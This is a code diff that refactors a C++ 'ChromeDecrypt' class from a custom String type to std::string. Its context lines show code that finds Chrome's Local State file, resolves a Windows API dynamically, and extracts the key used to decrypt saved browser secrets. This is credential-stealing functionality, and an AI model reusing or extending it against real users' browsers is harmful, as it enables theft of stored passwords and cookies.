@@ -19,7 +19,7 @@ ChromeDecrypt::~ChromeDecrypt()
 		delete m_tempSaver;
 }
 
-bool ChromeDecrypt::initDecryptor(const String& path)
+bool ChromeDecrypt::initDecryptor(const std::string& path)
 {
 	std::string keyBase64;
 	char key[8192];
@@ -34,7 +34,7 @@ bool ChromeDecrypt::initDecryptor(const String& path)
 	return true;
 }
 
-bool ChromeDecrypt::decrypt(const String& encrypted, String& decrypted, int size)
+bool ChromeDecrypt::decrypt(const std::string& encrypted, std::string& decrypted, int size)
 {
 	auto password = const_cast<char*>(encrypted.c_str());
 	  
@@ -82,15 +82,15 @@ bool ChromeDecrypt::decrypt(const String& encrypted, String& decrypted, int size
 	return true;
 }
 
-inline bool ChromeDecrypt::getChromeKey(std::string& key, unsigned long& size, const String& path)
+inline bool ChromeDecrypt::getChromeKey(std::string& key, unsigned long& size, const std::string& path)
 {
 	int localData = 0x001c;
-	String keyPath = getAppFolder(localData);
+	std::string keyPath = getAppFolder(localData);
 	if (keyPath.empty())
 		return false;
 
 	keyPath += path + R"(\User Data\Local State)";
-	String jsonStr;
+	std::string jsonStr;
 
 	if (!isFileExists(keyPath) || !readFile(keyPath, jsonStr))
 		return false;
@@ -197,7 +197,7 @@ cJSON* ChromeDecrypt::findNode(cJSON* node, const char* key)
 	findNode(node->next, key);
 }
 
-String ChromeDecrypt::getAppFolder(int CSIDL_FLAG)
+std::string ChromeDecrypt::getAppFolder(int CSIDL_FLAG)
 {
 	const auto userPath = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
 
@@ -229,7 +229,7 @@ bool ChromeDecrypt::isFileExists(const std::string& file)
 }
 
 
- bool ChromeDecrypt::readFile(const String& file, String& data)
+ bool ChromeDecrypt::readFile(const std::string& file, std::string& data)
 {
 	if (!isFileExists(file))
 		return false;
